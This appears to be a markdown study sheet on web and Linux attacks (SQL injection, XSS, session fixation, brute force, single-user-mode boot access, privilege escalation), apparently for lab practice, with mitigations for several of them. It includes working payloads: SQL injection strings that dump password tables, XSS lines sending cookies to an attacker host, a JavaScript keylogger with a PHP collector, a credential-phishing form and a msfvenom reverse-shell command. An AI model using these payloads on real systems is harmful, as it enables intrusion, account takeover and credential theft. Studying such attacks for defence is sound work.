## Attacks
### SQL Injection
- Find the database
    Suppose a vulnerable website with a backend MySql database allows querying data like so
    ```bash
    $ SELECT col1, col2, col3 from <table> where <col> Like '%{user_input}%'
    ```
    We can verify its a Mysql Database by passing
    ```bash
    value' AND 1 == sleep(3);--
    ```
    If there is a delay in response due to sleep, then its a MySql database else keep trying for equivalent commands for other     database
- Find other tables

    If we pass this value in the user field
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--
    ```
    This will result in the follwing query getting executed in backend
    ```bash
    SELECT col1, col2, col3 from <table> where <col> Like '%some_value' 
    UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.tables);--%'
    ```
- Query a sensitive table

    One way to randomly guess is to select from a particular table and execute a sleep. If the table exists then, you will see     delay in response else you will immediately see an error.

    OR

    pass below in user input to see the columns of the sensitive table
    ```bash
    some_value' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME='users');--
    ```
    Now you can query data from sensitive table
    ```bash
    some_value' UNION (SELECT user_password, address, 3 FROM users);--
    ```
Mitigation
- Use parameterized queries
- Validate user input

### Javascript Injection
Can allow the attacker manipulate client side code in the website by injecting malicious javascript via <script></script> tag via an unsanitized user input field
Typical JS Injection targets are:
- Various forums
- Article‘s comments fields
- Guestbooks
- Any other forms where text can be inserted.

Imagine a product comany with a text field for customer reviews. An attacker can then inject the follwing to alter the look and field of the website for other users, when they load the page
```bash
<script>$document.getElementById("some-id").style.visibility="hidden"</script>
```
```bash
<script>document.background-image: url(“other-bad-image.jpg“);</script>
```
Mitigation
- Sanitize user input
- Remove `script` tag when saving in database
### XSS
Attacker tries to gain information by injecting javascript in the target website. 
This can result in
- Cookie theft
    ```bash
    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
    ```
- Keylogging

    exploit.js
    ```bash
    var keys = '';

    document.onkeypress = function(e) {
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
        key = String.fromCharCode(key);
        keys += key;----
    }

    window.setInterval(function(){
        new Image().src = 'http://127.0.0.1/demo/1/exploit/exploit.php?keylog=' + keys;
        keys = '';
    }, 1000);
    ```
    server
    ```bash
    <?php

    if(!empty($_GET['keylog'])) {
        $logfile = fopen('logs.txt', 'a+');
        fwrite($logfile, $_GET['keylog']);
        fclose($logfile);
    }
    ?>
    ```
- Phishing
  The payload below injects a form forcing unsuspecting users to enter login and password
  ```bash
  <h3>Please login to proceed</h3> 
  <form action=http://attacker>
    Username:
    <br><input type="username" name="username"></br>
    Password:
    <br><input type="password" name="password"></br>
    <br><input type="submit" value="Login"></br>
  </form>
  ```
- Perform unauthorized activities
    Posting comment on user's behalf
    ```bash
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
        xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
        xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
    </script>
    ```

Types of XSS
  - Reflective

    When attacker tricks an user to click on a link (sent in email) and adds malicious js code in the link
    ```bash
    https://www.bigbank.com/q?=
    <script>
    document.write('<img src="http://attacker/?cookie='+ document.cookie'"/>')
    </script>
    ```
  - Persistent

    This can happen when attacker successfully injects js in a webpage that loads for other users

    1. Attcker --> POST https://website/comment
    ```bash
    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
    ```
    2. Website saves comment with js code withing script tag
    3. Victim loads webpage, obliious of malicious js loading GET http://website/comments
    4. Attacker receives cookie 
    ```
    http://attacker-site/?cookie=<some-cookie>
    ```
### CSRF
### Broken authentication
### Buffer Overflow
### Clickjack
### Session Fixation
Session fixation occurs when the attacker forces the victim to login to a website using a predetermined valid sessionid. Once authenticated, the sessionId will be associated with the authenticated victim session. The attacker can then use the sesiionId to login into the victim's account
1. Attacker loads a webpage and gets an unauthenticated sessionId
2. The attacker induces the victim to load the target webiste using that sessionId
3. The victim authenticates and logs in this associating the session with the victims's authenticated session
4. The attacker then uses that session to login to victim's account

### Brute fore 
#### Dictionary Attack
- Sniper: allows a single payload tried against every input field you select
- Battering Ram: tries a wordlist across all selected inputs at the same time
- Pitch Fork: Has 2 wordlists, matches first word with first/second/.. field in 2nd list
- Cluster Bomb: tries every combination of the the selected wordlists.

Example - DVWA. 
To launch a dictionary attack, 
- Open BurpSuite and load the Login page
- Right click --> Send to Intruder
- Clcik clear (Clear $) to clear highlighted field
- Select username and password and click (ADD $)
- GoTo Payloads, load payload from wordlist
- Start attack

#### Fuzzing
Fuzz testing or Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.

Example - 
Consider a website that allows uploading files. To find out what kind of files are allowed, we can launch a fuzz attack using BurpSuite. 
To do this we intercept the traffic and then send a list of extensions in the payload

Click on "Payloads" ---> "Sniper" attack type.
Click the "Payloads" tab now, find the filename and "Add §" to the extension

### Single User mode
Its possible to gain unauthorised access to a Linux system is to boot the server into Single User Mode because it does not, by default, require a root password to gain root level access. 
Single User Mood can be accessed by power cycling the machine and interrupting the boot process.
- Restart the machine
- Interrupt the boot process
- Press `e` to edit the boot configuration file
- Append to the line starting `Linux` one of either `s`, `S`, `1` or `systemd`. 
  ```bash
  unit=[rescue.target, emergency.target, rescue]
  ```
- Press ctrl+x

Mitigation:
- For a traditional init based system.

  As root edit the file `/etc/sysconfig/init` then on the line `SINGLE=/sbin/sushell` change sushell to `sulogin`.
- For a systemd based system

  The target configuration need to be altered for the root password to be prompted for. 
  The targets are located in `/lib/systemd/system`. 
  The files which need alteration are `emergency.service` and `rescue.service`. 
  Alter the line starting 
  ```bash
  ExecStart=-/bin/sh –c “/usr/sbin/sushell; ……”
  ```
  change the `/usr/sbin/sushell` to `/usr/sbin/sulogin` in both `emergency.service` and `rescue.service`.
- Protecting against bootloader side loading

  The GRUB bootloader can be password protected by placing the configuration in /etc/grub.d/40_custom file because this file     will remain un touched by updates and upgrades to the boot loader. In /etc/grub.d/40_custom add set superusers=”admin” then   password admin after that save and exit the file and run the following command grub2-mkpasswd-… (allow tab completion to       finish this command so that the system compatible script is run) the output of this command from grub2. Onwards need to be     added to the end of the line password admin in /etc/grub.d/40_custom. After that the grub file need to be recompiled by       running the command grub2-mkconfig –o /boot/grub2/grub.cfg for centos or update-grub¬ on debian.
### Privilege escalation
At it's core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.
 - Reset passwords
 - Bypass access controls to compromise protected data
 - Edit software configurations
 - Enable persistence, so you can access the machine again later.
 - Change privilege of users
 - Get that cheeky root flag
 
Horizontal privilege escalation: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access.

Vertical privilege escalation: This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges.

Once the attacker gains access to the target machine, he/she will try to escalate priviledge to root.

#### SUID 
(Set owner User ID upon execution) is a special type of file permissions given to a file. 
Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. 
SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. 

In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command.

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx

Example - passwd command.
This command is used to change user password and this edits, /etc/passwd and /etc/shadow (permissions only granted to root).
So passwd command is set with SUID to give root user permissions to normal user so that it can update /etc/shadow and other files.

To find all SUID files, execute (4000 is a special permission for SUID files)
```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \;
$ find / -perm -u=s -type f 2>/dev/null
```
If system is misconfigured, then you may find `systemctl` misconfigured with SUID priviledge

#### Escaping vi
If vi has root priviledges, you can open shell by `:sh!`

#### Exploiting crontab
There may be instances where crontab may be misconfigured to processes with root priviledges. We can use that to create a shell with root
Create a payload
```
$ msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
Get the shell
```
$ nc -lvp 8888
```

Scan vulnerabilities with
- LinPeeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
- LinEnum - https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Exploit using - https://gtfobins.github.io/

Refer
- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation
